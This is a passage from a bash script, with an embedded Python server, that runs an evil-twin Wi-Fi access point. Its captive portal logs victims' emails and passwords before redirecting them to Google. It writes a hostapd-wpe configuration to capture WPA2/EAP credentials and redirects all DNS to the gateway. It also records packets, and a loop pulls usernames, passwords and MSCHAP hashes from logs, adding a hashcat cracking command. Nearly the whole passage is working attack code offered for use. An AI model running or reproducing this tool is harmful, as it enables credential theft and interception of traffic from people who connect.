            self.send_header('Location', 'http://192.168.1.1/')
            self.end_headers()

    def do_POST(self):
        if self.path == '/login':
            try:
                content_length = int(self.headers.get('Content-Length', 0))
                post_data = self.rfile.read(content_length)
                params = urllib.parse.parse_qs(post_data.decode('utf-8', errors='replace'))

                email    = params.get('email', [''])[0]
                password = params.get('password', [''])[0]
                client_ip = self.client_address[0]

                timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                log_entry = f"[{timestamp}] IP: {client_ip} | Email: {email} | Password: {password}\n"

                with open(PORTAL_LOG, 'a') as f:
                    f.write(log_entry)

                print(f"\033[1;31m[PORTAL CAPTURE]\033[0m {log_entry.strip()}", flush=True)

            except Exception as e:
                print(f"[ERROR] Failed to capture credentials: {e}", flush=True)

            self.send_response(302)
            self.send_header('Location', 'http://www.google.com')
            self.end_headers()
        else:
            self.send_response(404)
            self.end_headers()

    def log_message(self, format, *args):
        pass  # Suppress default access log noise

socketserver.TCPServer.allow_reuse_address = True
with socketserver.TCPServer(("", PORT), PortalHandler) as httpd:
    print(f"Captive portal serving on port {PORT}", flush=True)
    httpd.serve_forever()
SERVEREOF

    chmod +x "$CAPTIVE_PORTAL_DIR/server.py"

    log_info "Starting captive portal server..."
    nohup python3 "$CAPTIVE_PORTAL_DIR/server.py" > /tmp/fakeap_portal_server.log 2>&1 &
    echo $! > /tmp/fakeap_portal.pid
    sleep 2

    PORTAL_PID=$(cat /tmp/fakeap_portal.pid 2>/dev/null || echo "")
    if [[ -n "$PORTAL_PID" ]] && kill -0 "$PORTAL_PID" 2>/dev/null; then
        log_info "✓ Captive portal started (PID: $PORTAL_PID)"
    else
        log_error "Failed to start captive portal — check /tmp/fakeap_portal_server.log"
        cat /tmp/fakeap_portal_server.log 2>/dev/null || true
    fi
fi

# Create hostapd config
if [[ "$CAPTURE_AUTH" == "true" ]]; then
    log_info "Creating hostapd-wpe config for WPA2 password capture..."
    HOSTAPD_CONFIG="$HOSTAPD_WPE_CONF"

    # FIX 11: Use if/fi block instead of command substitution in heredoc
    # Avoids blank lines and is clearer
    {
        cat <<EOF
interface=$WLAN_IF
driver=nl80211
ssid=$SSID
channel=$CHANNEL
hw_mode=g
ieee80211n=1
wmm_enabled=1
EOF
        [[ "$HIDE_SSID" == "true" ]] && echo "ignore_broadcast_ssid=1"
        cat <<EOF

# WPA2 configuration for password capture
wpa=2
wpa_key_mgmt=WPA-PSK WPA-EAP
wpa_pairwise=CCMP
rsn_pairwise=CCMP
wpa_passphrase=12345678

# EAP credential capture
ieee8021x=1
eap_server=1
eap_user_file=/etc/hostapd-wpe/hostapd-wpe.eap_user
ca_cert=/etc/hostapd-wpe/certs/ca.pem
server_cert=/etc/hostapd-wpe/certs/server.pem
private_key=/etc/hostapd-wpe/certs/server.key
private_key_passwd=whatever
dh_file=/etc/hostapd-wpe/certs/dh

# Logging
logger_syslog=-1
logger_syslog_level=0
logger_stdout=-1
logger_stdout_level=0
challenge_response_username=hostapd-wpe
EOF
    } > "$HOSTAPD_CONFIG"
else
    log_info "Creating hostapd config for open network..."
    HOSTAPD_CONFIG="$HOSTAPD_CONF"

    {
        cat <<EOF
interface=$WLAN_IF
driver=nl80211
ssid=$SSID
channel=$CHANNEL
hw_mode=g
ieee80211n=1
wmm_enabled=1
EOF
        [[ "$HIDE_SSID" == "true" ]] && echo "ignore_broadcast_ssid=1"
        echo ""
        echo "# Open network (no authentication)"
    } > "$HOSTAPD_CONFIG"
fi

# Start hostapd
log_info "Starting $HOSTAPD_CMD..."
nohup $HOSTAPD_CMD "$HOSTAPD_CONFIG" > "$HOSTAPD_LOG" 2>&1 &
HOSTAPD_PID=$!
echo "$HOSTAPD_PID" > "$HOSTAPD_PIDFILE"
sleep 3

if ! kill -0 "$HOSTAPD_PID" 2>/dev/null; then
    log_error "hostapd died unexpectedly. Log:"
    cat "$HOSTAPD_LOG" 2>/dev/null || true
    cleanup; exit 5
fi
log_info "✓ hostapd started (PID: $HOSTAPD_PID)"

# Apply bandwidth limiting
if [[ "$ENABLE_BANDWIDTH_LIMIT" == "true" ]]; then
    log_info "Applying bandwidth limit: ${BANDWIDTH_LIMIT}KB/s per client"
    tc qdisc add dev "$WLAN_IF" root handle 1: htb default 10
    tc class add dev "$WLAN_IF" parent 1:  classid 1:1  htb rate "${BANDWIDTH_LIMIT}kbit"
    tc class add dev "$WLAN_IF" parent 1:1 classid 1:10 htb rate "${BANDWIDTH_LIMIT}kbit"
    log_info "✓ Bandwidth limiting configured"
fi

# Create dnsmasq config
log_info "Creating dnsmasq configuration..."
cat > "$DNSMASQ_CONF" <<EOF
interface=$WLAN_IF
bind-interfaces
dhcp-range=${DHCP_RANGE_START},${DHCP_RANGE_END},255.255.255.0,12h
dhcp-option=3,${AP_IP}
dhcp-option=6,${AP_IP}
server=8.8.8.8
server=8.8.4.4
log-queries
log-dhcp
log-facility=${DNSMASQ_LOG}
listen-address=${AP_IP}
dhcp-authoritative
EOF

# Add captive portal DNS redirect if enabled
if [[ "$ENABLE_CAPTIVE_PORTAL" == "true" ]]; then
    cat >> "$DNSMASQ_CONF" <<EOF

# Captive portal — redirect all DNS to gateway
address=/#/${AP_IP}
EOF
fi

# FIX 4: Run dnsmasq directly — not piped through tee
# Piping through tee captures tee's PID as $!, not dnsmasq's
log_info "Starting dnsmasq..."
dnsmasq --conf-file="$DNSMASQ_CONF" \
        --pid-file="$DNSMASQ_PIDFILE" \
        2>"$DNSMASQ_LOG"

# FIX 4b: Wait up to 5s for pidfile (dnsmasq writes it asynchronously)
local_waited=0
while [[ ! -f "$DNSMASQ_PIDFILE" ]] && [[ $local_waited -lt 5 ]]; do
    sleep 1
    local_waited=$((local_waited + 1))
done

if [[ ! -f "$DNSMASQ_PIDFILE" ]]; then
    log_error "dnsmasq failed to start"
    [[ -f "$DNSMASQ_LOG" ]] && cat "$DNSMASQ_LOG"
    cleanup; exit 6
fi

DNSMASQ_PID=$(cat "$DNSMASQ_PIDFILE")
log_info "✓ dnsmasq started (PID: $DNSMASQ_PID)"

# Enable NAT and forwarding if uplink provided
if [[ -n "${UPLINK_IF:-}" && "$UPLINK_IF" != "none" ]]; then
    log_info "Enabling NAT and IP forwarding via $UPLINK_IF"

    if ! ip link show "$UPLINK_IF" >/dev/null 2>&1; then
        log_error "Uplink interface '$UPLINK_IF' does not exist"
        cleanup; exit 7
    fi

    sysctl -w net.ipv4.ip_forward=1 >/dev/null

    iptables -t nat -C POSTROUTING -o "$UPLINK_IF" -s "$AP_NET" -j MASQUERADE 2>/dev/null || \
        iptables -t nat -A POSTROUTING -o "$UPLINK_IF" -s "$AP_NET" -j MASQUERADE

    iptables -C FORWARD -i "$WLAN_IF" -o "$UPLINK_IF" -j ACCEPT 2>/dev/null || \
        iptables -A FORWARD -i "$WLAN_IF" -o "$UPLINK_IF" -j ACCEPT

    iptables -C FORWARD -i "$UPLINK_IF" -o "$WLAN_IF" \
        -m state --state RELATED,ESTABLISHED -j ACCEPT 2>/dev/null || \
        iptables -A FORWARD -i "$UPLINK_IF" -o "$WLAN_IF" \
        -m state --state RELATED,ESTABLISHED -j ACCEPT

    log_info "✓ NAT configured"
fi

# Start packet monitoring if enabled
if [[ "$ENABLE_MONITOR" == "true" ]]; then
    log_info "Starting packet monitoring..."
    PCAP_FILE="$PCAP_DIR/capture_$(date +%Y%m%d_%H%M%S).pcap"
    nohup tcpdump -i "$WLAN_IF" -w "$PCAP_FILE" > /tmp/fakeap_tcpdump.log 2>&1 &
    echo $! > /tmp/fakeap_monitor.pid
    log_info "✓ Monitoring started (PID: $(cat /tmp/fakeap_monitor.pid)) → $PCAP_FILE"
fi

# Display status
echo
print_banner
echo
log_info "Interface:  $WLAN_IF"
log_info "Gateway:    $AP_IP"
log_info "DHCP Range: ${DHCP_RANGE_START} - ${DHCP_RANGE_END}"
[[ "$UPLINK_IF" != "none" ]] && \
    log_info "Internet:   Shared via $UPLINK_IF" || \
    log_info "Internet:   Not shared (no uplink)"
[[ "$CAPTURE_AUTH" == "true" ]]          && log_warn "Security:   WPA2 PASSWORD CAPTURE ACTIVE"
[[ "$HIDE_SSID" == "true" ]]             && log_warn "SSID:       HIDDEN"
[[ "$ENABLE_MONITOR" == "true" ]]        && log_info "Monitoring: ACTIVE → $PCAP_DIR"
[[ "$ENABLE_CAPTIVE_PORTAL" == "true" ]] && log_warn "Portal:     ACTIVE at http://${AP_IP}"
[[ "$ENABLE_BANDWIDTH_LIMIT" == "true" ]] && log_info "Bandwidth:  ${BANDWIDTH_LIMIT}KB/s per client"
[[ "$ENABLE_MAC_FILTER" == "true" ]]     && log_info "MAC Filter: ACTIVE"
echo

[[ "$CAPTURE_AUTH" == "true" ]] && {
    echo -e "${RED}╔═══════════════════════════════════════════════════════╗${NC}"
    echo -e "${RED}║  ⚠️  PASSWORD CAPTURE MODE ACTIVE  ⚠️                 ║${NC}"
    echo -e "${RED}║  Credentials logged to: $AUTH_LOG  ${NC}"
    echo -e "${RED}╚═══════════════════════════════════════════════════════╝${NC}"
}

[[ "$ENABLE_CAPTIVE_PORTAL" == "true" ]] && {
    echo -e "${RED}╔═══════════════════════════════════════════════════════╗${NC}"
    echo -e "${RED}║  ⚠️  CAPTIVE PORTAL ACTIVE  ⚠️                        ║${NC}"
    echo -e "${RED}║  Credentials logged to: $PORTAL_LOG  ${NC}"
    echo -e "${RED}╚═══════════════════════════════════════════════════════╝${NC}"
}

echo -e "${YELLOW}Waiting for clients... (Ctrl-C to stop)${NC}"
echo -e "${BLUE}Commands:${NC}"
echo "  sudo $0 status"
echo "  sudo $0 stop ${UPLINK_IF}"
echo "  tail -f $HOSTAPD_LOG"
[[ "$ENABLE_CAPTIVE_PORTAL" == "true" ]] && echo "  tail -f $PORTAL_LOG"
[[ "$ENABLE_MONITOR" == "true" ]]        && echo "  ls -lh $PCAP_DIR"
echo

# ---- Monitor loop ----
LAST_LEASE_COUNT=0
LAST_LOG_SIZE=0
LAST_PORTAL_SIZE=0

while true; do
    sleep 3

    # Check hostapd
    if [[ -f "$HOSTAPD_PIDFILE" ]]; then
        AP_PID=$(cat "$HOSTAPD_PIDFILE" 2>/dev/null || echo "")
        if [[ -n "$AP_PID" ]] && ! kill -0 "$AP_PID" 2>/dev/null; then
            log_error "hostapd (PID $AP_PID) stopped unexpectedly"
            tail -n 20 "$HOSTAPD_LOG" 2>/dev/null || true
            cleanup; exit 8
        fi
    fi

    # Check dnsmasq
    if [[ -f "$DNSMASQ_PIDFILE" ]]; then
        DNS_PID=$(cat "$DNSMASQ_PIDFILE" 2>/dev/null || echo "")
        if [[ -n "$DNS_PID" ]] && ! kill -0 "$DNS_PID" 2>/dev/null; then
            log_error "dnsmasq (PID $DNS_PID) stopped unexpectedly"
            tail -n 20 "$DNSMASQ_LOG" 2>/dev/null || true
            cleanup; exit 9
        fi
    fi

    # Monitor captive portal captures
    if [[ "$ENABLE_CAPTIVE_PORTAL" == "true" ]] && [[ -f "$PORTAL_LOG" ]]; then
        CURRENT_PORTAL_SIZE=$(wc -l < "$PORTAL_LOG" 2>/dev/null || echo "0")
        if [[ $CURRENT_PORTAL_SIZE -gt $LAST_PORTAL_SIZE ]]; then
            local_new_portal=$((CURRENT_PORTAL_SIZE - LAST_PORTAL_SIZE))
            LAST_PORTAL_SIZE=$CURRENT_PORTAL_SIZE
            tail -n "$local_new_portal" "$PORTAL_LOG" | while IFS= read -r line; do
                if [[ "$line" =~ \[.*\].*IP:.*Email:.*Password: ]]; then
                    log_warn "🔑 PORTAL CREDENTIAL CAPTURED!"
                    echo -e "${YELLOW}$line${NC}"
                fi
            done
        fi
    fi

    # Monitor hostapd-wpe log for credentials
    if [[ "$CAPTURE_AUTH" == "true" ]] && [[ -f "$HOSTAPD_LOG" ]]; then
        CURRENT_LOG_SIZE=$(wc -l < "$HOSTAPD_LOG" 2>/dev/null || echo "0")
        if [[ $CURRENT_LOG_SIZE -gt $LAST_LOG_SIZE ]]; then
            NEW_LINES=$((CURRENT_LOG_SIZE - LAST_LOG_SIZE))
            LAST_LOG_SIZE=$CURRENT_LOG_SIZE

            tail -n "$NEW_LINES" "$HOSTAPD_LOG" | while IFS= read -r line; do
                TIMESTAMP=$(date '+%Y-%m-%d %H:%M:%S')
                MAC=$(echo "$line" | grep -oE '([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}' | head -1)

                if echo "$line" | grep -iq "username:"; then
                    USERNAME=$(echo "$line" | sed -n 's/.*username: *\(.*\)/\1/p' \
                        | sed 's/[[:space:]]*$//' | tr -d '\r\n')
                    if [[ -n "$USERNAME" ]]; then
                        echo "[$TIMESTAMP] 👤 USERNAME: $USERNAME" | tee -a "$AUTH_LOG"
                        [[ -n "$MAC" ]] && echo "    From MAC: $MAC" | tee -a "$AUTH_LOG"
                        log_info "👤 Username: $USERNAME"
                    fi
                fi

                if echo "$line" | grep -iq "password:"; then
                    PASSWORD_CAPTURED=$(echo "$line" | sed -n 's/.*password: *\(.*\)/\1/p' \
                        | sed 's/[[:space:]]*$//' | tr -d '\r\n')
                    if [[ -n "$PASSWORD_CAPTURED" ]]; then
                        echo "[$TIMESTAMP] 🔐 PASSWORD CAPTURED: $PASSWORD_CAPTURED" | tee -a "$AUTH_LOG"
                        [[ -n "$MAC" ]] && echo "    From MAC: $MAC" | tee -a "$AUTH_LOG"
                        echo >> "$AUTH_LOG"
                        log_warn "════════════════════════════════"
                        log_warn "🔐 PASSWORD: $PASSWORD_CAPTURED"
                        log_warn "📱 MAC: ${MAC:-Unknown}"
                        log_warn "════════════════════════════════"
                    fi
                fi

                if echo "$line" | grep -iq "mschap.*challenge\|mschap.*response"; then
                    echo "[$TIMESTAMP] 🔓 MSCHAP attempt" | tee -a "$AUTH_LOG"
                    echo "$line" >> "$AUTH_LOG"
                    [[ -n "$MAC" ]] && echo "    From MAC: $MAC" | tee -a "$AUTH_LOG"
                    HASH=$(echo "$line" | grep -oE '[0-9a-fA-F]{48,}' | head -1)
                    if [[ -n "$HASH" ]]; then
                        echo "    Hash: $HASH" >> "$AUTH_LOG"
                        echo "    Crack: hashcat -m 5500 hash.txt wordlist.txt" >> "$AUTH_LOG"
                        log_info "🔓 Hash from ${MAC:-Unknown}"
                    fi
                    echo >> "$AUTH_LOG"
                fi

                if echo "$line" | grep -iq "AP-STA-CONNECTED" && [[ -n "$MAC" ]]; then
                    echo "[$TIMESTAMP] ✅ $MAC connected" | tee -a "$AUTH_LOG"
                    log_info "✅ $MAC connected"
                fi

                if echo "$line" | grep -iq "WPA.*4-Way.*M1\|WPA.*4-Way.*M3" && [[ -n "$MAC" ]]; then
                    echo "[$TIMESTAMP] 🔑 $MAC attempting auth..." | tee -a "$AUTH_LOG"
                    log_info "🔑 $MAC entering password..."
                fi

                if echo "$line" | grep -iq "authentication.*failed\|AP-STA-DISCONNECTED" && [[ -n "$MAC" ]]; then
                    echo "[$TIMESTAMP] ❌ $MAC failed/disconnected" | tee -a "$AUTH_LOG"
                    log_warn "❌ $MAC failed or disconnected"
                fi
            done
        fi
    fi

    # FIX 5 + FIX 6: Dynamic lease file, correct update order
    [[ -z "$LEASE_FILE" ]] && for _lf in /var/lib/misc/dnsmasq.leases \
                                          /var/lib/dnsmasq/dnsmasq.leases \
                                          /tmp/dnsmasq.leases; do
        [[ -f "$_lf" ]] && { LEASE_FILE="$_lf"; break; }
    done

    if [[ -n "$LEASE_FILE" ]] && [[ -f "$LEASE_FILE" ]]; then
        CURRENT_LEASE_COUNT=$(wc -l < "$LEASE_FILE")
        if [[ $CURRENT_LEASE_COUNT -gt $LAST_LEASE_COUNT ]]; then
            # FIX 6: Calculate diff BEFORE updating counter
            local_new=$((CURRENT_LEASE_COUNT - LAST_LEASE_COUNT))
            LAST_LEASE_COUNT=$CURRENT_LEASE_COUNT

            log_info "New client(s) connected:"
            tail -n "$local_new" "$LEASE_FILE" | \
                awk '{printf "  MAC: %s  IP: %s  Hostname: %s\n", $2, $3, $4}'

            if [[ "$CAPTURE_AUTH" == "true" ]] || [[ "$ENABLE_MONITOR" == "true" ]]; then
                tail -n "$local_new" "$LEASE_FILE" | \
                    awk -v ts="$(date '+%Y-%m-%d %H:%M:%S')" \
                    '{printf "[%s] DHCP: MAC=%s IP=%s Host=%s\n", ts, $2, $3, $4}' \
                    >> "$AUTH_LOG"
            fi
        fi
    fi

    # FIX 14: Use dynamic $LEASE_FILE instead of hardcoded path in stats
    if [[ "$ENABLE_MONITOR" == "true" ]] && [[ -f "$MONITOR_LOG" ]]; then
        local_clients=0
        [[ -n "$LEASE_FILE" ]] && [[ -f "$LEASE_FILE" ]] && \
            local_clients=$(wc -l < "$LEASE_FILE" 2>/dev/null || echo 0)
        echo "[$(date '+%Y-%m-%d %H:%M:%S')] Active connections: $local_clients" >> "$MONITOR_LOG"
    fi
done